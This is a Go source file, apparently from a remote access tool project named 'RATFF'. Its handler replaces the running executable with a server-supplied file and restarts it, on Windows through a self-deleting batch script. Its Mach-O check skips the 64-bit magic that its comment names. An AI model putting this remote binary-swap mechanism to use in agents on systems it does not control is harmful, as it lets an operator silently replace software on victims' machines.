package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"syscall"

	"RATFF/shared"
)

// FileType defines the type of file being updated.
type FileType string

const (
	FileTypeELF     FileType = "elf_executable"
	FileTypePE      FileType = "pe_executable"
	FileTypeMachO   FileType = "macho_executable"
	FileTypeUnknown FileType = "unknown"
)

// DetectFileType detects the real file type by parsing file content (not extension).
func DetectFileType(filePath string) (FileType, error) {
	f, err := os.Open(filePath)
	if err != nil {
		return FileTypeUnknown, err
	}
	defer f.Close()

	header := make([]byte, 4)
	if _, err := f.Read(header); err != nil {
		return FileTypeUnknown, err
	}

	// PE: MZ header
	if header[0] == 'M' && header[1] == 'Z' {
		return FileTypePE, nil
	}

	// ELF: 0x7f 'E' 'L' 'F'
	if header[0] == 0x7f && header[1] == 'E' && header[2] == 'L' && header[3] == 'F' {
		return FileTypeELF, nil
	}

	// Mach-O: feedfacf or cefaedfe (32/64 bit)
	if (header[0] == 0xfe && header[1] == 0xed && header[2] == 0xfa && header[3] == 0xce) ||
		(header[0] == 0xce && header[1] == 0xfa && header[2] == 0xed && header[3] == 0xfe) {
		return FileTypeMachO, nil
	}

	return FileTypeUnknown, nil
}

// handleServiceUpdate handles the service update command.
func handleServiceUpdate(msg shared.Message) shared.Message {
	tempPath, _ := msg.Payload["temp_path"].(string)
	if tempPath == "" {
		return shared.NewMessage(shared.MsgError, shared.CmdServiceUpdate, msg.ClientID,
			map[string]interface{}{"error": "missing temp_path"})
	}

	exePath, err := os.Executable()
	if err != nil {
		return shared.NewMessage(shared.MsgError, shared.CmdServiceUpdate, msg.ClientID,
			map[string]interface{}{"error": fmt.Sprintf("get executable path failed: %v", err)})
	}

	fileType, err := DetectFileType(tempPath)
	if err != nil {
		return shared.NewMessage(shared.MsgError, shared.CmdServiceUpdate, msg.ClientID,
			map[string]interface{}{"error": fmt.Sprintf("detect file type failed: %v", err)})
	}

	log.WithField("file_type", fileType).Info("Processing update file")

	switch fileType {
	case FileTypeELF, FileTypePE, FileTypeMachO:
		return handleExecutableUpdate(msg.ClientID, tempPath, exePath)
	default:
		return shared.NewMessage(shared.MsgError, shared.CmdServiceUpdate, msg.ClientID,
			map[string]interface{}{"error": fmt.Sprintf("unsupported file type: %s, only executable files are supported", fileType)})
	}
}

// handleExecutableUpdate replaces the current executable and restarts the service.
func handleExecutableUpdate(clientID, tempPath, exePath string) shared.Message {
	switch runtime.GOOS {
	case "windows":
		return restartWithBatchScript(clientID, tempPath, exePath)
	case "linux", "darwin":
		return restartWithUnixMethod(clientID, tempPath, exePath)
	default:
		return shared.NewMessage(shared.MsgError, shared.CmdServiceUpdate, clientID,
			map[string]interface{}{"error": fmt.Sprintf("unsupported OS: %s", runtime.GOOS)})
	}
}

// restartWithBatchScript handles Windows update using a batch script for delayed replacement.
func restartWithBatchScript(clientID, tempPath, exePath string) shared.Message {
	batPath := exePath + ".update.bat"

	batContent := fmt.Sprintf(`@echo off
timeout /t 2 /nobreak > nul
del /f /q "%s"
move /y "%s" "%s"
start "" "%s"
del "%%~f0"
`, exePath, tempPath, exePath, exePath)

	if err := os.WriteFile(batPath, []byte(batContent), 0644); err != nil {
		return shared.NewMessage(shared.MsgError, shared.CmdServiceUpdate, clientID,
			map[string]interface{}{"error": fmt.Sprintf("create batch script failed: %v", err)})
	}

	cmd := exec.Command("cmd", "/C", "start", "/B", batPath)
	if err := cmd.Start(); err != nil {
		return shared.NewMessage(shared.MsgError, shared.CmdServiceUpdate, clientID,
			map[string]interface{}{"error": fmt.Sprintf("start batch script failed: %v", err)})
	}

	os.Exit(0)
	return shared.Message{}
}

// restartWithUnixMethod handles Unix update using direct replacement and exec.
func restartWithUnixMethod(clientID, tempPath, exePath string) shared.Message {
	if err := os.Chmod(tempPath, 0755); err != nil {
		return shared.NewMessage(shared.MsgError, shared.CmdServiceUpdate, clientID,
			map[string]interface{}{"error": fmt.Sprintf("chmod failed: %v", err)})
	}

	if err := os.Rename(tempPath, exePath); err != nil {
		if copyErr := copyFile(tempPath, exePath); copyErr != nil {
			return shared.NewMessage(shared.MsgError, shared.CmdServiceUpdate, clientID,
				map[string]interface{}{"error": fmt.Sprintf("replace executable failed: %v", copyErr)})
		}
	}

	if err := syscall.Exec(exePath, os.Args, os.Environ()); err != nil {
		cmd := exec.Command(exePath, os.Args[1:]...)
		cmd.Start()
		os.Exit(0)
	}

	return shared.Message{}
}
